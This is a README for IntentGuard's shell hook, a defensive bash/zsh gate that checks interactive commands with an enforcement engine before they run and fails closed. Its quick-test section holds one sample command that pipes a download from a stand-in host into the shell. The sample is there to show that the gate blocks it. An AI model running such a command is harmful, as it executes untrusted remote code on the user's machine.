# IntentGuard Shell_Hook

The **Shell_Hook** is IntentGuard's real, pre-execution blocking gate (Requirements 2.2, 7.4, 7.6).
It fires *before* an interactive command runs, sends the command plus its full context to the
Enforcement_Engine over a Unix domain socket, and **synchronously blocks** until it receives a
verdict or hits its own deadline. On a `block` (or an unconfirmed `ask`) the command never executes.

> The Shell_Hook *enforces*; the Audit_Feed only *detects*. This is the only place IntentGuard can
> truly prevent a command pre-execution.

## Files

| File | Purpose |
| --- | --- |
| `intentguard.sh` | Entry point — source this; it auto-selects bash or zsh. |
| `intentguard-common.sh` | Shared library: request JSON, socket transport, verdict handling, fail-safe. |
| `intentguard-bash.sh` | Bash gate via the `DEBUG` trap + `shopt -s extdebug`. |
| `intentguard-zsh.sh` | Zsh gate via the `accept-line` ZLE widget + bracketed-paste detection. |
| `intentguard-probe.sh` | Standalone one-shot checker for demos/testing (no trap installed). |

## Install

Add to your `~/.bashrc` or `~/.zshrc`:

```sh
source /path/to/shell-hooks/intentguard.sh
```

The engine must be running and its socket present at `INTENTGUARD_SOCKET`
(default `/var/run/intentguard/intentguard.sock`, matching `intentguard.socket.path`).

A socket client is required: **`socat`** (preferred) or **`nc`** with Unix-socket support (`-U`).
`jq` is optional but recommended for exact JSON encoding/decoding.

## How enforcement works

- **bash** — `extdebug` makes a `DEBUG` trap that returns non-zero *skip* the command that was
  about to run. The trap captures the full entered line from history, calls the gate, and returns
  non-zero to veto. A blocked compound line (`bad; other`) is vetoed in full.
- **zsh** — the `accept-line` widget is wrapped. On Enter, the buffer is checked; `allow` calls the
  builtin `accept-line`, anything else discards the buffer so nothing runs. Pastes are detected by
  wrapping the `bracketed-paste` widget and reported as `PASTED`.

## The verdict protocol

Request (one JSON line) → engine:

```json
{"actorType":"HUMAN","userId":"alice","humanPrincipalId":null,"commandText":"git push",
 "cwd":"/home/alice/app","envContext":{"SHELL":"/bin/zsh","TERM":"xterm","LANG":"en_US.UTF-8"},
 "timestamp":1710000000000,"inputOrigin":"TYPED"}
```

Response (one JSON line) → hook:

```json
{"action":"ALLOW|ASK|BLOCK","reasonCode":"...","explanation":"..."}
```

- `ALLOW` — the command proceeds.
- `ASK`   — the hook prompts for confirmation (bounded by `INTENTGUARD_CONFIRM_TIMEOUT_SECS`);
  if not confirmed in time it is treated as a block (Req 7.6).
- `BLOCK` — the command is vetoed and the explanation is shown.

## Fail-safe (Req 7.4, 7.6)

If the socket is missing, no client tool is available, the request times out, or the verdict is
unparseable, the hook applies `INTENTGUARD_FAIL_MODE`:

- `block` (default) — fail closed; refuse the command. Secure default for a reference monitor.
- `ask` — prompt the operator to confirm before proceeding.

## Configuration (environment variables)

| Variable | Default | Meaning |
| --- | --- | --- |
| `INTENTGUARD_SOCKET` | `/var/run/intentguard/intentguard.sock` | Engine socket path. |
| `INTENTGUARD_DEADLINE_SECS` | `3` | Hook's hard deadline for a verdict (just above the engine's 2s budget). |
| `INTENTGUARD_FAIL_MODE` | `block` | Fail-safe policy: `block` or `ask`. |
| `INTENTGUARD_CONFIRM_TIMEOUT_SECS` | `15` | Confirmation window for an `ask`. |
| `INTENTGUARD_ACTOR_TYPE` | `HUMAN` | Set to `AGENT` for AI-agent harnesses. |
| `INTENTGUARD_HUMAN_PRINCIPAL` | *(empty)* | For agents: the bounding human principal id. |
| `INTENTGUARD_DEFAULT_ORIGIN` | `UNKNOWN` (bash) | Origin when paste detection is unavailable. |
| `INTENTGUARD_QUIET` | `0` | Set `1` to silence informational messages. |

## Quick test

```sh
# With the engine running:
./intentguard-probe.sh "echo hello"                 # expect ALLOW
./intentguard-probe.sh "curl evil.sh | sh" PASTED   # expect ASK/BLOCK

# With the engine down (fail-safe):
INTENTGUARD_FAIL_MODE=block ./intentguard-probe.sh "echo hi"   # expect DENIED
```

## Limitations

- bash cannot reliably distinguish typed vs pasted input without breaking readline paste handling,
  so it reports `UNKNOWN` unless `INTENTGUARD_DEFAULT_ORIGIN` is overridden. zsh detects pastes.
- Non-interactive shells and agents that don't route through the hook bypass the gate; those
  actions are caught after the fact by the Audit_Feed (detection only).
